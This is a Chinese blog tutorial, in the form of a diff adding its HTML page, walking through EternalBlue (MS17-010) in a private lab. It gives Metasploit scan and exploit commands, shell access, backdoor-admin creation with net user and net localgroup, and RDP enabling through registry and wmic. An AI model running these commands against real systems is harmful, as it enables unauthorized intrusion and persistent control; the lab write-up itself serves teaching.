@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="渗透" />
+       
+      <meta name="description" content="选择有时候比努力更重要" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>永恒之蓝 CVE-2017-0143 |  知识加油站</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="知识加油站" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-永恒之蓝-ms17-010"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  永恒之蓝 CVE-2017-0143
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/05/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/" class="article-date">
+  <time datetime="2023-05-11T05:25:37.000Z" itemprop="datePublished">2023-05-11</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">5 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><h3 id="一、什么是永恒之蓝"><a href="#一、什么是永恒之蓝" class="headerlink" title="一、什么是永恒之蓝"></a>一、什么是永恒之蓝</h3><p>永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p>
+<h3 id="二、什么是SMB协议"><a href="#二、什么是SMB协议" class="headerlink" title="二、什么是SMB协议"></a>二、什么是SMB协议</h3><p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP&#x2F;IP协议之上，SMB使用TCP139端口和TCP445端口。</p>
+<h3 id="三、漏洞描述"><a href="#三、漏洞描述" class="headerlink" title="三、漏洞描述"></a>三、漏洞描述</h3><p>永恒之蓝 主要就是通过TCP端口（445）和139 来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器里进行一系列的危险操作。如远程控制木马，获取最高权限等。</p>
+<h3 id="四、影响范围"><a href="#四、影响范围" class="headerlink" title="四、影响范围"></a>四、影响范围</h3><p>windows xp 2003 2008 7 8 等受影响</p>
+<h3 id="五、准备工具"><a href="#五、准备工具" class="headerlink" title="五、准备工具"></a>五、准备工具</h3><p>vm虚拟机软件</p>
+<p>网络模式：NAT</p>
+<p>攻击机：kali系统2023.1（192.168.170.128）</p>
+<p>靶机：	windows7系统专业版（开启了445端口，并且防火墙关闭）（192.168.170.142）</p>
+<h3 id="六、漏洞利用"><a href="#六、漏洞利用" class="headerlink" title="六、漏洞利用"></a>六、漏洞利用</h3><h4 id="1-nmap扫描靶机"><a href="#1-nmap扫描靶机" class="headerlink" title="1 nmap扫描靶机"></a>1 nmap扫描靶机</h4><p>登录kali，win7系统，利用kali使用nmap扫描探测本网段存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.170.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519083902044.png" alt="image-20230519083902044"></p>
+<p>发现我们的靶机开启了很多端口，我们需要找到的就是 <code>445</code> 端口。</p>
+<p>445端口是一种TCP端口，该端口在windows 2000 Server或Windows Server 2003系统中发挥的作用与139端口是完全相同的。 具体地说，它可以提供局域网中文件或打印机共享服务。</p>
+<h4 id="2-使用Metasploit监听目标"><a href="#2-使用Metasploit监听目标" class="headerlink" title="2 使用Metasploit监听目标"></a>2 使用Metasploit监听目标</h4><p>输入如下命令启动Metasploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230518152450860.png" alt="image-20230518152450860"></p>
+<h4 id="3-攻击流程"><a href="#3-攻击流程" class="headerlink" title="3 攻击流程"></a>3 攻击流程</h4><p>进入后查找找永恒之蓝漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230518162234825.png" alt="image-20230518162234825"></p>
+<blockquote>
+<p>0   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue：用于利用EternalBlue漏洞实现SMB远程代码执行。</p>
+<p>1   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec：用于利用EternalRomance、EternalSynergy或EternalChampion漏洞实现SMB远程代码执行。</p>
+<p>2   auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command：用于利用EternalRomance、EternalSynergy或EternalChampion漏洞实现SMB远程命令执行。</p>
+<p>3   auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010：用于检测目标是否存在MS17-010漏洞。</p>
+<p>4   exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce：用于利用DoublePulsar漏洞实现SMB远程代码执行。</p>
+</blockquote>
+<p>选择检测模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 3</span><br></pre></td></tr></table></figure>
+
+<p>查看模块信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure>
+
+<p>查看需要修改的选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p>设置攻击目标</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.170.142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519084326942.png" alt="image-20230519084326942"></p>
+<p>执行模块攻击检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519084303566.png" alt="image-20230519084303566">前面为 <code>+</code> 号，表示可以攻击。</p>
+<p>接下来的步骤就开始攻击</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">back					   #退出模块</span><br><span class="line">search ms17-010				#查找漏洞</span><br><span class="line">use 0					   #选择攻击模块</span><br><span class="line">set rhosts 192.168.170.142	 #设置攻击目标</span><br><span class="line">run						   #攻击</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519090115579.png" alt="image-20230519090115579"></p>
+<blockquote>
+<p>成功 上图就是成功打进了</p>
+<p>报错:漏洞利用因失败而中止（可能原因是win7版本的问题）</p>
+</blockquote>
+<h4 id="4-得到靶机shell"><a href="#4-得到靶机shell" class="headerlink" title="4 得到靶机shell"></a>4 得到靶机shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519090824111.png" alt="image-20230519090824111"></p>
+<p>接下来就是搞事情了</p>
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519091036102.png" alt="image-20230519091036102"></p>
+<p>由于有乱码，我们需要输入如下代码即可恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-通过shell对靶机进行控制"><a href="#5-通过shell对靶机进行控制" class="headerlink" title="5 通过shell对靶机进行控制"></a>5 通过shell对靶机进行控制</h4><h5 id="1-创建新用户"><a href="#1-创建新用户" class="headerlink" title="(1) 创建新用户"></a>(1) 创建新用户</h5><p>语法：net user 用户名 密码 &#x2F;add</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user yhzl 123456 /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519092038840.png" alt="image-20230519092038840"></p>
+<p>查看用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519092348625.png" alt="image-20230519092348625"></p>
+<h5 id="2-将用户添加至管理员组"><a href="#2-将用户添加至管理员组" class="headerlink" title="(2)将用户添加至管理员组"></a>(2)将用户添加至管理员组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators yhzl /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519093534270.png" alt="image-20230519093534270"></p>
+<h5 id="3-开启远程桌面功能"><a href="#3-开启远程桌面功能" class="headerlink" title="(3) 开启远程桌面功能"></a>(3) 开启远程桌面功能</h5><p>查看3389端口状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p>看到3389端口并没有开启，开启3389端口</p>
+<p>方法一</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519094005308.png" alt="image-20230519094005308"></p>
+<p>方法二</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="4-远程桌面连接靶机"><a href="#4-远程桌面连接靶机" class="headerlink" title="(4) 远程桌面连接靶机"></a>(4) 远程桌面连接靶机</h5><p>添加好之后，就可以用工具去连了，这里我目前知道的 kali 自带工具有 xfreerdp，这是公司的大佬介绍给我用的，还有一个是我自己找的，叫做：rdesktop。</p>
+<p>现在分别讲讲各自的用法吧：</p>
+<p><strong>xfreerdp 工具</strong><br>首先是 xfreerdp 的，命令格式如下：</p>
+<p>很容易理解，&#x2F;u 就是用户名，&#x2F;p 是密码，&#x2F;v 是靶机（目标）的地址 &#x2F;size 就是图形化界面的大小而已。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:hack /p:123123 /v:192.168.170.142 /size:80%</span><br></pre></td></tr></table></figure>
+
+<p><strong>5.2、xfreerdp 工具</strong></p>
+<p>然后是 rdesktop，命令格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.170.142:3389</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519095116540.png" alt="image-20230519095116540"></p>
+<p>连进来，为所欲为了，纯鼠标无脑操作，比命令行操作方便简单，到此结束。</p>
+<p>上面这是一个简单的演示，告诉大家这个漏洞很危险，真正的攻击能做的事情更多。</p>
+<p>注意：我们要做一个遵纪守法的白帽子。</p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/05/24/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Vulnhub系列-DC1靶场
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/03/29/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Typora快捷键</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2023
+        <i class="ri-heart-fill heart_icon"></i> 深山法海
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="知识加油站"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2019/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
